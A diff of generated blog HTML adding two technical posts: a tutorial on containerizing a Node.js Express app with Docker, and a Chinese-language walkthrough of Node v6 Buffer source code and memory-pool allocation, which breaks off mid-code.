@@ -53,6 +53,376 @@
     <header>
       
         <div class="icon"></div>
+        <time datetime="2018-04-20T06:45:23.000Z"><a href="/2018/04/20/Docker/Dockerizing a Node.js web app/">2018-04-20</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/04/20/Docker/Dockerizing a Node.js web app/">Dockerizing a Node.js web app</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>The goal of this example is to show you how to get a Node.js application into a Docker container. The guide is intended for development, and <em>not</em> for a production deployment. The guide also assumes you have a working <a href="https://docs.docker.com/engine/installation/" target="_blank" rel="noopener">Docker installation</a> and a basic understanding of how a Node.js application is structured.</p>
+<p>In the first part of this guide we will create a simple web application in Node.js, then we will build a Docker image for that application, and lastly we will run the image as a container.</p>
+<p>Docker allows you to package an application with all of its dependencies into a standardized unit, called a container, for software development. A container is a stripped-to-basics version of a Linux operating system. An image is software you load into a container.</p>
+<h2 id="Create-the-Node-js-app"><a href="#Create-the-Node-js-app" class="headerlink" title="Create the Node.js app"></a>Create the Node.js app</h2><p>First, create a new directory where all the files would live. In this directory create a <code>package.json</code> file that describes your app and its dependencies:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;docker_web_app&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;Node.js on Docker&quot;,</span><br><span class="line">  &quot;author&quot;: &quot;First Last &lt;first.last@example.com&gt;&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;server.js&quot;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;node server.js&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;express&quot;: &quot;^4.16.1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>With your new <code>package.json</code> file, run <code>npm install</code>. If you are using <code>npm</code> version 5 or later, this will generate a <code>package-lock.json</code> file which will be copied to your Docker image.</p>
+<p>Then, create a <code>server.js</code> file that defines a web app using the <a href="https://expressjs.com/" target="_blank" rel="noopener">Express.js</a> framework:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&apos;use strict&apos;;</span><br><span class="line"></span><br><span class="line">const express = require(&apos;express&apos;);</span><br><span class="line"></span><br><span class="line">// Constants</span><br><span class="line">const PORT = 8080;</span><br><span class="line">const HOST = &apos;0.0.0.0&apos;;</span><br><span class="line"></span><br><span class="line">// App</span><br><span class="line">const app = express();</span><br><span class="line">app.get(&apos;/&apos;, (req, res) =&gt; &#123;</span><br><span class="line">  res.send(&apos;Hello world\n&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, HOST);</span><br><span class="line">console.log(`Running on http://$&#123;HOST&#125;:$&#123;PORT&#125;`);</span><br></pre></td></tr></table></figure>
+<p>In the next steps, we’ll look at how you can run this app inside a Docker container using the official Docker image. First, you’ll need to build a Docker image of your app.</p>
+<h2 id="Creating-a-Dockerfile"><a href="#Creating-a-Dockerfile" class="headerlink" title="Creating a Dockerfile"></a>Creating a Dockerfile</h2><p>Create an empty file called <code>Dockerfile</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch Dockerfile</span><br></pre></td></tr></table></figure>
+<p>Open the <code>Dockerfile</code> in your favorite text editor</p>
+<p>The first thing we need to do is define from what image we want to build from. Here we will use the latest LTS (long term support) version <code>8</code> of <code>node</code> available from the <a href="https://hub.docker.com/" target="_blank" rel="noopener">Docker Hub</a>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FROM node:8</span><br></pre></td></tr></table></figure>
+<p>Next we create a directory to hold the application code inside the image, this will be the working directory for your application:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Create app directory</span><br><span class="line">WORKDIR /usr/src/app</span><br></pre></td></tr></table></figure>
+<p>This image comes with Node.js and NPM already installed so the next thing we need to do is to install your app dependencies using the <code>npm</code> binary. Please note that if you are using <code>npm</code> version 4 or earlier a <code>package-lock.json</code> file will <em>not</em> be generated.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Install app dependencies</span><br><span class="line"># A wildcard is used to ensure both package.json AND package-lock.json are copied</span><br><span class="line"># where available (npm@5+)</span><br><span class="line">COPY package*.json ./</span><br><span class="line"></span><br><span class="line">RUN npm install</span><br><span class="line"># If you are building your code for production</span><br><span class="line"># RUN npm install --only=production</span><br></pre></td></tr></table></figure>
+<p>Note that, rather than copying the entire working directory, we are only copying the <code>package.json</code> file. This allows us to take advantage of cached Docker layers. bitJudo has a good explanation of this <a href="http://bitjudo.com/blog/2014/03/13/building-efficient-dockerfiles-node-dot-js/" target="_blank" rel="noopener">here</a>.</p>
+<p>To bundle your app’s source code inside the Docker image, use the <code>COPY</code> instruction:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Bundle app source</span><br><span class="line">COPY . .</span><br></pre></td></tr></table></figure>
+<p>Your app binds to port <code>8080</code> so you’ll use the <code>EXPOSE</code> instruction to have it mapped by the <code>docker</code> daemon:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPOSE 8080</span><br></pre></td></tr></table></figure>
+<p>Last but not least, define the command to run your app using <code>CMD</code> which defines your runtime. Here we will use the basic <code>npm start</code> which will run <code>node server.js</code> to start your server:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CMD [ &quot;npm&quot;, &quot;start&quot; ]</span><br></pre></td></tr></table></figure>
+<p>Your <code>Dockerfile</code> should now look like this:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">FROM node:8</span><br><span class="line"></span><br><span class="line"># Create app directory</span><br><span class="line">WORKDIR /usr/src/app</span><br><span class="line"></span><br><span class="line"># Install app dependencies</span><br><span class="line"># A wildcard is used to ensure both package.json AND package-lock.json are copied</span><br><span class="line"># where available (npm@5+)</span><br><span class="line">COPY package*.json ./</span><br><span class="line"></span><br><span class="line">RUN npm install</span><br><span class="line"># If you are building your code for production</span><br><span class="line"># RUN npm install --only=production</span><br><span class="line"></span><br><span class="line"># Bundle app source</span><br><span class="line">COPY . .</span><br><span class="line"></span><br><span class="line">EXPOSE 8080</span><br><span class="line">CMD [ &quot;npm&quot;, &quot;start&quot; ]</span><br></pre></td></tr></table></figure>
+<h2 id="dockerignore-file"><a href="#dockerignore-file" class="headerlink" title=".dockerignore file"></a>.dockerignore file</h2><p>Create a <code>.dockerignore</code> file in the same directory as your <code>Dockerfile</code> with following content:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node_modules</span><br><span class="line">npm-debug.log</span><br></pre></td></tr></table></figure>
+<p>This will prevent your local modules and debug logs from being copied onto your Docker image and possibly overwriting modules installed within your image.</p>
+<h2 id="Building-your-image"><a href="#Building-your-image" class="headerlink" title="Building your image"></a>Building your image</h2><p>Go to the directory that has your <code>Dockerfile</code> and run the following command to build the Docker image. The <code>-t</code> flag lets you tag your image so it’s easier to find later using the <code>docker images</code> command:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build -t &lt;your username&gt;/node-web-app .</span><br></pre></td></tr></table></figure>
+<p>Your image will now be listed by Docker:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br><span class="line"></span><br><span class="line"># Example</span><br><span class="line">REPOSITORY                      TAG        ID              CREATED</span><br><span class="line">node                            8          1934b0b038d1    5 days ago</span><br><span class="line">&lt;your username&gt;/node-web-app    latest     d64d3505b0d2    1 minute ago</span><br></pre></td></tr></table></figure>
+<h2 id="Run-the-image"><a href="#Run-the-image" class="headerlink" title="Run the image"></a>Run the image</h2><p>Running your image with <code>-d</code> runs the container in detached mode, leaving the container running in the background. The <code>-p</code> flag redirects a public port to a private port inside the container. Run the image you previously built:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -p 49160:8080 -d &lt;your username&gt;/node-web-app</span><br></pre></td></tr></table></figure>
+<p>Print the output of your app:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Get container ID</span><br><span class="line">$ docker ps</span><br><span class="line"></span><br><span class="line"># Print app output</span><br><span class="line">$ docker logs &lt;container id&gt;</span><br><span class="line"></span><br><span class="line"># Example</span><br><span class="line">Running on http://localhost:8080</span><br></pre></td></tr></table></figure>
+<p>If you need to go inside the container you can use the <code>exec</code> command:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Enter the container</span><br><span class="line">$ docker exec -it &lt;container id&gt; /bin/bash</span><br></pre></td></tr></table></figure>
+<h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><p>To test your app, get the port of your app that Docker mapped:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps</span><br><span class="line"></span><br><span class="line"># Example</span><br><span class="line">ID            IMAGE                                COMMAND    ...   PORTS</span><br><span class="line">ecce33b30ebf  &lt;your username&gt;/node-web-app:latest  npm start  ...   49160-&gt;8080</span><br></pre></td></tr></table></figure>
+<p>In the example above, Docker mapped the <code>8080</code> port inside of the container to the port <code>49160</code> on your machine.</p>
+<p>Now you can call your app using <code>curl</code> (install if needed via: <code>sudo apt-get install curl</code>):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ curl -i localhost:49160</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 12</span><br><span class="line">ETag: W/&quot;c-M6tWOb/Y57lesdjQuHeB1P/qTV0&quot;</span><br><span class="line">Date: Mon, 13 Nov 2017 20:53:59 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure>
+<p>We hope this tutorial helped you get up and running a simple Node.js application on Docker.</p>
+<p>You can find more information about Docker and Node.js on Docker in the following places:</p>
+<ul>
+<li><a href="https://registry.hub.docker.com/_/node/" target="_blank" rel="noopener">Official Node.js Docker Image</a></li>
+<li><a href="https://github.com/nodejs/docker-node/blob/master/docs/BestPractices.md" target="_blank" rel="noopener">Node.js Docker Best Practices Guide</a></li>
+<li><a href="https://docs.docker.com/" target="_blank" rel="noopener">Official Docker documentation</a></li>
+<li><a href="https://stackoverflow.com/questions/tagged/docker" target="_blank" rel="noopener">Docker Tag on Stack Overflow</a></li>
+<li><a href="https://reddit.com/r/docker" target="_blank" rel="noopener">Docker Subreddit</a></li>
+</ul>
+<h3 id="original"><a href="#original" class="headerlink" title="original"></a>original</h3><p><a href="https://nodejs.org/en/docs/guides/nodejs-docker-webapp/" target="_blank" rel="noopener">https://nodejs.org/en/docs/guides/nodejs-docker-webapp/</a></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-03-25T14:16:53.000Z"><a href="/2018/03/25/Node.js_IO/Node源码解析_buffer/">2018-03-25</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/03/25/Node.js_IO/Node源码解析_buffer/">Node源码解析_buffer</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>在Node、ES2015出现之前，前端工程师只需要进行一些简单的字符串或DOM操作就可以满足业务需要，所以对二进制数据是比较陌生。node出现以后，前端面对的技术场景发生了变化，可以深入到网络传输、文件操作、图片处理等领域，而这些操作都与二进制数据紧密相关。</p>
+<p>Node里面的buffer，是一个二进制数据容器，数据结构类似与数组，数组里面的方法在buffer都存在(slice操作的结果不一样)。下面就从源码(v6.0版本)层面分析，揭开buffer操作的面纱。</p>
+<h2 id="1-buffer的基本使用"><a href="#1-buffer的基本使用" class="headerlink" title="1. buffer的基本使用"></a>1. buffer的基本使用</h2><p>在Node 6.0以前，直接使用<code>new Buffer</code>，但是这种方式存在两个问题:</p>
+<ul>
+<li>参数复杂: 内存分配，还是内存分配+内容写入，需要根据参数来确定</li>
+<li>安全隐患: 分配到的内存可能还存储着旧数据，这样就存在安全隐患</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 本来只想申请一块内存，但是里面却存在旧数据</span></span><br><span class="line"><span class="keyword">const</span> buf1 = <span class="keyword">new</span> Buffer(<span class="number">10</span>) <span class="comment">// &lt;Buffer 90 09 70 6b bf 7f 00 00 50 3a&gt;</span></span><br><span class="line"><span class="comment">// 不小心，旧数据就被读取出来了</span></span><br><span class="line">buf1.toString()  <span class="comment">// '�\tpk�\u0000\u0000P:'</span></span><br></pre></td></tr></table></figure>
+<p>为了解决上述问题，Buffer提供了<code>Buffer.from</code>、<code>Buffer.alloc</code>、<code>Buffer.allocUnsafe</code>、<code>Buffer.allocUnsafeSlow</code>四个方法来申请内存。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 申请10个字节的内存</span></span><br><span class="line"><span class="keyword">const</span> buf2 = Buffer.alloc(<span class="number">10</span>) <span class="comment">// &lt;Buffer 00 00 00 00 00 00 00 00 00 00&gt;</span></span><br><span class="line"><span class="comment">// 默认情况下，用0进行填充</span></span><br><span class="line">buf2.toString() <span class="comment">//'\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 上述操作就相当于</span></span><br><span class="line"><span class="keyword">const</span> buf1 = <span class="keyword">new</span> Buffer(<span class="number">10</span>);</span><br><span class="line">buf.fill(<span class="number">0</span>);</span><br><span class="line">buf.toString(); <span class="comment">// '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'</span></span><br></pre></td></tr></table></figure>
+<h2 id="2-buffer的结构"><a href="#2-buffer的结构" class="headerlink" title="2. buffer的结构"></a>2. buffer的结构</h2><p>buffer是一个典型的javascript与c++结合的模块，其性能部分用c++实现，非性能部分用javascript来实现。<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/buffer01_180710.png" alt=""></p>
+<p>下面看看buffer模块的内部结构:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exports.Buffer = Buffer;</span><br><span class="line">exports.SlowBuffer = SlowBuffer;</span><br><span class="line">exports.INSPECT_MAX_BYTES = 50;</span><br><span class="line">exports.kMaxLength = binding.kMaxLength;</span><br></pre></td></tr></table></figure>
+<p>buffer模块提供了4个接口:</p>
+<ul>
+<li>Buffer: 二进制数据容器类，node启动时默认加载</li>
+<li>SlowBuffer: 同样也是二进制数据容器类，不过直接进行内存申请</li>
+<li>INSPECT_MAX_BYTES: 限制<code>bufObject.inspect()</code>输出的长度</li>
+<li>kMaxLength: 一次性内存分配的上限，大小为(2^31 - 1)</li>
+</ul>
+<p>其中，由于Buffer经常使用，所以node在启动的时候，就已经加载了Buffer，而其他三个，仍然需要使用<code>require(&#39;buffer&#39;).***</code>。</p>
+<p>关于buffer的内存申请、填充、修改等涉及性能问题的操作，均通过c++里面的node_buffer.cc来实现:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// c++里面的node_buffer</span><br><span class="line">namespace node &#123;</span><br><span class="line">  bool zero_fill_all_buffers = false;</span><br><span class="line">  namespace Buffer &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">NODE_MODULE_CONTEXT_AWARE_BUILTIN(buffer, node::Buffer::Initialize)</span><br></pre></td></tr></table></figure>
+<h2 id="3-内存分配的策略"><a href="#3-内存分配的策略" class="headerlink" title="3. 内存分配的策略"></a>3. 内存分配的策略</h2><p>Node中Buffer内存分配太过常见，从系统性能考虑出发，Buffer采用了如下的管理策略。<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/buffer02_180710.png" alt=""></p>
+<h3 id="3-1-Buffer-from"><a href="#3-1-Buffer-from" class="headerlink" title="3.1 Buffer.from"></a>3.1 Buffer.from</h3><p><code>Buffer.from(value, ...)</code>用于申请内存，并将内容写入刚刚申请的内存中，value值是多样的，Buffer是如何处理的呢？让我们一起看看源码:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Buffer.from = <span class="function"><span class="keyword">function</span>(<span class="params">value, encodingOrOffset, length</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> value === <span class="string">'number'</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'"value" argument must not be a number'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (value <span class="keyword">instanceof</span> <span class="built_in">ArrayBuffer</span>)</span><br><span class="line">    <span class="keyword">return</span> fromArrayBuffer(value, encodingOrOffset, length);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> value === <span class="string">'string'</span>)</span><br><span class="line">    <span class="keyword">return</span> fromString(value, encodingOrOffset);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fromObject(value);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>value可以分成三类:</p>
+<ul>
+<li>ArrayBuffer的实例: ArrayBuffer是ES2015里面引入的，用于在浏览器端直接操作二进制数据，这样Node就与ES2015关联起来，同时，新创建的Buffer与ArrayBuffer内存是共享的</li>
+<li>string: 该方法实现了将字符串转变为Buffer</li>
+<li>Buffer/TypeArray/Array: 会进行值的copy</li>
+</ul>
+<h4 id="3-1-1-ArrayBuffer的实例"><a href="#3-1-1-ArrayBuffer的实例" class="headerlink" title="3.1.1 ArrayBuffer的实例"></a>3.1.1 ArrayBuffer的实例</h4><p>Node v6与时俱进，将浏览器、node中对二进制数据的操作关联起来，同时二者会进行内存的共享。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">var</span> v1 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(b);</span><br><span class="line"><span class="keyword">var</span> buf = Buffer.from(b)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'first, typeArray: '</span>, v1) <span class="comment">// first, typeArray:  Uint8Array [ 0, 0, 0, 0 ]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'first, Buffer: '</span>, buf) <span class="comment">// first, Buffer:  &lt;Buffer 00 00 00 00&gt;</span></span><br><span class="line">v1[<span class="number">0</span>] = <span class="number">12</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'second, typeArray: '</span>, v1) <span class="comment">// second, typeArray:  Uint8Array [ 12, 0, 0, 0 ]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'second, Buffer: '</span>, buf) <span class="comment">// second, Buffer:  &lt;Buffer 0c 00 00 00&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在上述操作中，对ArrayBuffer的操作，引起Buffer值的修改，说明二者在内存上是同享的，再从源码层面了解下这个过程:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// buffer.js Buffer.from(arrayBuffer, ...)进入的分支:</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fromArrayBuffer</span>(<span class="params">obj, byteOffset, length</span>) </span>&#123;</span><br><span class="line">  byteOffset &gt;&gt;&gt;= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> length === <span class="string">'undefined'</span>)</span><br><span class="line">    <span class="keyword">return</span> binding.createFromArrayBuffer(obj, byteOffset);</span><br><span class="line"></span><br><span class="line">  length &gt;&gt;&gt;= <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> binding.createFromArrayBuffer(obj, byteOffset, length);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// c++ 模块中的node_buffer:</span></span><br><span class="line"><span class="keyword">void</span> CreateFromArrayBuffer(<span class="keyword">const</span> FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123;</span><br><span class="line">  ...</span><br><span class="line">  Local&lt;<span class="built_in">ArrayBuffer</span>&gt; ab = args[<span class="number">0</span>].As&lt;<span class="built_in">ArrayBuffer</span>&gt;();</span><br><span class="line">  ...</span><br><span class="line">  Local&lt;<span class="built_in">Uint8Array</span>&gt; ui = <span class="built_in">Uint8Array</span>::New(ab, offset, max_length);</span><br><span class="line">  ...</span><br><span class="line">  args.GetReturnValue().Set(ui);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="3-1-2-string"><a href="#3-1-2-string" class="headerlink" title="3.1.2 string"></a>3.1.2 string</h4><p>可以实现字符串与Buffer之间的转换，同时考虑到操作的性能，采用了一些优化策略避免频繁进行内存分配:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fromString</span>(<span class="params">string, encoding</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">var</span> length = byteLength(string, encoding);</span><br><span class="line">  <span class="keyword">if</span> (length === <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> Buffer.alloc(<span class="number">0</span>);</span><br><span class="line">  <span class="comment">// 当字符所需要的字节数大于4KB时: 直接进行内存分配</span></span><br><span class="line">  <span class="keyword">if</span> (length &gt;= (Buffer.poolSize &gt;&gt;&gt; <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> binding.createFromString(string, encoding);</span><br><span class="line">  <span class="comment">// 当字符所需字节数小于4KB: 借助allocPool先申请、后分配的策略</span></span><br><span class="line">  <span class="keyword">if</span> (length &gt; (poolSize - poolOffset))</span><br><span class="line">    createPool();</span><br><span class="line">  <span class="keyword">var</span> actual = allocPool.write(string, poolOffset, encoding);</span><br><span class="line">  <span class="keyword">var</span> b = allocPool.slice(poolOffset, poolOffset + actual);</span><br><span class="line">  poolOffset += actual;</span><br><span class="line">  alignPool();</span><br><span class="line">  <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><em>a. 直接内存分配</em></p>
+<p>当字符串所需要的字节大于4KB时，如何还从8KB的buffer pool中进行申请，那么就可能存在内存浪费，例如:</p>
+<p>poolSize - poolOffset &lt; 4KB: 这样就要重新申请一个8KB的pool，刚才那个pool剩余空间就会被浪费掉</p>
+<p>看看c++是如何进行内存分配的:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// c++</span></span><br><span class="line"><span class="keyword">void</span> CreateFromString(<span class="keyword">const</span> FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123;</span><br><span class="line">  ...</span><br><span class="line">  Local&lt;<span class="built_in">Object</span>&gt; buf;</span><br><span class="line">  <span class="keyword">if</span> (New(args.GetIsolate(), args[<span class="number">0</span>].As&lt;<span class="built_in">String</span>&gt;(), enc).ToLocal(&amp;buf))</span><br><span class="line">    args.GetReturnValue().Set(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><em>b. 借助于pool管理</em></p>
+<p>用一个pool来管理频繁的行为，在计算机中是非常常见的行为，例如http模块中，关于tcp连接的建立，就设置了一个tcp pool。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fromString</span>(<span class="params">string, encoding</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 当字符所需字节数小于4KB: 借助allocPool先申请、后分配的策略</span></span><br><span class="line">  <span class="comment">// pool的空间不够用，重新分配8kb的内存</span></span><br><span class="line">  <span class="keyword">if</span> (length &gt; (poolSize - poolOffset))</span><br><span class="line">    createPool();</span><br><span class="line">  <span 